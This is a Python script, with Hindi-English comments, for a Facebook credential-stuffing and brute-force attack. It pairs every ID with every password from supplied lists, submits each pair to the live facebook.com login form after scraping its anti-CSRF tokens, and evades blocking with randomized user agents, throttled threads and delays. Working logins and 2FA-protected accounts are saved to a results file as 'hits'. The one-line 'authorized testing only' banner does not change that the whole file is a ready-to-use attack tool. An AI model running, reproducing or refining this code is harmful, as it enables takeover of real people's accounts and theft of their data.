import os
import re
import time
import json
import uuid
import random
import requests
import sys
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
# USER FILES (same directory mein rakhein)
# ============================================================
ID_FILE = "ids.txt"           # 1 ID per line
PASS_FILE = "passwords.txt"   # 1 password per line
RESULT_FILE = "RESULTS.txt"   # Yahan hits save honge
# ============================================================

os.system('clear' if 'win' in sys.platform else 'clear')

# Colors
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
B = '\033[1;34m'
W = '\033[1;37m'
M = '\033[1;35m'
RESET = '\033[0m'

hits = []
attempted = 0
total_attempts = 0
start_time = datetime.now()

# ============================================================
# USER AGENTS
# ============================================================
def random_ua():
    """Realistic browser user agents"""
    uas = [
        f"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile/15E148 Safari/604.1",
    ]
    return random.choice(uas)

# ============================================================
# LOAD FILES
# ============================================================
def load_file(filepath, label):
    if not os.path.exists(filepath):
        print(f"{R}[!] ERROR: '{filepath}' nahi mili!{RESET}")
        print(f"{Y}Is file ko script wali directory mein rakhein.{RESET}")
        sys.exit(1)
    with open(filepath, 'r', errors='ignore') as f:
        items = [line.strip() for line in f if line.strip()]
    items = list(dict.fromkeys(items))  # Remove duplicates
    print(f"{G}[✓] {label}: {len(items)} items loaded from '{filepath}'{RESET}")
    return items

# ============================================================
# REAL FACEBOOK LOGIN CHECK
# ============================================================
def check_login_real(email, password):
    """
    Real Facebook login check using www.facebook.com/login/
    
    Returns:
        "HIT"    -> Login successful
        "2FA"    -> Login successful but 2FA checkpoint
        "WRONG"  -> Wrong password
        "BLOCK"  -> Rate limited / blocked
        "ERROR"  -> Unexpected error
    """
    session = requests.Session()
    
    # Step 1: Get login page to extract hidden tokens
    headers1 = {
        'User-Agent': random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }
    
    try:
        r = session.get('https://www.facebook.com/', headers=headers1, timeout=15)
    except Exception as e:
        return "ERROR", str(e)
    
    # Extract hidden form fields from login page
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Facebook uses 'lsd' (LSD - Login Session Data) token
    lsd = ''
    lsd_input = soup.find('input', {'name': 'lsd'})
    if lsd_input:
        lsd = lsd_input.get('value', '')
    
    # jazoest is another anti-CSRF field
    jazoest = ''
    jazoest_input = soup.find('input', {'name': 'jazoest'})
    if jazoest_input:
        jazoest = jazoest_input.get('value', '')
    
    # Extract the action URL for the login form
    login_form = soup.find('form', {'id': 'login_form'})
    if not login_form:
        login_form = soup.find('form', {'method': 'post'})
    
    action_url = 'https://www.facebook.com/login/'
    if login_form and login_form.get('action'):
        action = login_form.get('action')
        if action.startswith('/'):
            action_url = 'https://www.facebook.com' + action
        else:
            action_url = action
    
    # Step 2: Submit login
    headers2 = {
        'User-Agent': random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.facebook.com',
        'DNT': '1',
        'Referer': 'https://www.facebook.com/',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    }
    
    data = {
        'lsd': lsd,
        'jazoest': jazoest,
        'email': email,
        'pass': password,
        'login_source': 'comet_headerless',
        'next': '',
        'enc': '',
        'cpl': '1',
    }
    
    # Response cookies check karne se pehle
    try:
        resp = session.post(action_url, data=data, headers=headers2, allow_redirects=False, timeout=15)
    except Exception as e:
        return "ERROR", str(e)
    
    # --- ANALYSIS ---
    # Check cookies for successful login
    c_user = session.cookies.get('c_user')
    xs = session.cookies.get('xs')
    sessionid = session.cookies.get('sessionid')
    
    if c_user and c_user.isdigit():
        # Login successful!
        user_id = c_user
        
        if 'checkpoint' in str(resp.headers.get('Location', '')):
            return "2FA", f"{email}|{password} (2FA Required, ID: {user_id})"
        else:
            return "HIT", f"{email}|{password} (ID: {user_id})"
    
    elif resp.status_code == 302:
        location = resp.headers.get('Location', '')
        
        if 'checkpoint' in location:
            # 2FA checkpoint
            return "2FA", f"{email}|{password} (2FA Checkpoint)"
        elif 'home.php' in location or 'facebook.com/' in location:
            # Might be success - check cookies more
            if 'sessionid' in session.cookies or 'c_user' in session.cookies:
                return "HIT", f"{email}|{password} (Cookie found)"
        
        return "WRONG", "Wrong password / Redirect"
    
    elif 'checkpoint' in resp.text or 'two-factor' in resp.text.lower():
        return "2FA", f"{email}|{password} (2FA detected in page)"
    
    elif 'Please try again' in resp.text or 'incorrect' in resp.text.lower():
        return "WRONG", "Wrong password"
    
    elif 'blocked' in resp.text.lower() or 'suspicious' in resp.text.lower():
        return "BLOCKED", f"{email}|{password} (Rate limited / Blocked)"
    
    elif 'c_user' in str(session.cookies):
        return "HIT", f"{email}|{password} (Session cookie)"
    
    # Default: probably wrong password
    return "WRONG", "Unknown result (likely wrong password)"


# ============================================================
# WORKER FUNCTION (runs in thread pool)
# ============================================================
def worker(email, password):
    """Single worker that checks one email+password combination"""
    global attempted, hits
    
    try:
        status, details = check_login_real(email, password)
        
        result_line = f"[{status}] {email}:{password} | {details}\n"
        
        if status == "HIT":
            hits.append(f"{email}|{password}")
            # Save immediately
            with open(RESULT_FILE, 'a') as f:
                f.write(f"[HIT] {email}|{password}\n")
            # Color output
            sys.stdout.write(f"\r{G}[✓] HIT! {email}:{password}{RESET}\n")
        elif status == "2FA":
            hits.append(f"{email}|{password} (2FA)")
            with open(RESULT_FILE, 'a') as f:
                f.write(f"[2FA] {email}|{password}\n")
            sys.stdout.write(f"\r{M}[2FA] {email}:{password} - 2FA Required{RESET}\n")
        elif status == "BLOCKED":
            sys.stdout.write(f"\r{R}[BLOCKED] {email} - Rate limited{RESET}\n")
        elif status == "WRONG":
            # Only show progress, not every wrong attempt
            pass
        else:
            sys.stdout.write(f"\r{Y}[{status}] {email}:{password}{RESET}\n")
        
    except Exception as e:
        pass


# ============================================================
# MAIN FUNCTION
# ============================================================
def main():
    global attempted, total_attempts, hits
    
    print(f"\n{C}{'='*60}{RESET}")
    print(f"{C}   REAL FACEBOOK LOGIN CHECKER (Web Login){RESET}")
    print(f"{C}   User-Provided ID & Password Lists{RESET}")
    print(f"{C}{'='*60}{RESET}")
    print(f"{Y}   ⚠️  This tool is for AUTHORIZED testing only{RESET}")
    print(f"{C}{'='*60}{RESET}\n")
    
    # Load files
    ids = load_file(ID_FILE, "IDs")
    passwords = load_file(PASS_FILE, "Passwords")
    
    print(f"\n{B}{'─'*50}{RESET}")
    print(f"{Y}ID List        : {len(ids)} IDs{RESET}")
    print(f"{Y}Password List  : {len(passwords)} passwords{RESET}")
    print(f"{Y}Total Attempts : {len(ids) * len(passwords)}{RESET}")
    print(f"{Y}Results will save to: {RESULT_FILE}{RESET}")
    print(f"{B}{'─'*50}{RESET}\n")
    
    # Build all combinations
    combinations = []
    for uid in ids:
        for pw in passwords:
            combinations.append((uid.strip(), pw.strip()))
    
    total_attempts = len(combinations)
    
    input(f"{G}[Press Enter to start cracking...]{RESET}\n")
    
    print(f"{C}[*] Starting... press Ctrl+C to stop anytime{RESET}\n")
    
    # Check if RESULT_FILE exists, clear it if it does
    if os.path.exists(RESULT_FILE):
        os.remove(RESULT_FILE)
    
    # Start time
    global start_time
    start_time = datetime.now()
    
    # Thread pool
    max_threads = 5  # Low threads to avoid IP block
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for email, pw in combinations:
            attempted += 1
            futures.append(executor.submit(worker, email, pw))
            time.sleep(random.uniform(1.0, 2.5))  # Delay between each attempt
        
        # Wait for all to complete
        for future in as_completed(futures):
            pass
    
    # Summary
    elapsed = datetime.now() - start_time
    print(f"\n\n{G}{'='*60}{RESET}")
    print(f"{G}   Cracking Complete!{RESET}")
    print(f"{C}   Total Attempted : {attempted}{RESET}")
    print(f"{G}   Total Hits      : {len(hits)}{RESET}")
    print(f"{Y}   Time Elapsed    : {elapsed}{RESET}")
    print(f"{G}   Results saved   : {RESULT_FILE}{RESET}")
    print(f"{C}{'='*60}{RESET}")
    
    if hits:
        print(f"\n{G}=== HITS ==={RESET}")
        for h in hits:
            print(f"{G}{h}{RESET}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Stopped by user{RESET}")
        elapsed = datetime.now() - start_time
        print(f"{C}Attempted: {attempted} | Hits: {len(hits)} | Time: {elapsed}{RESET}")
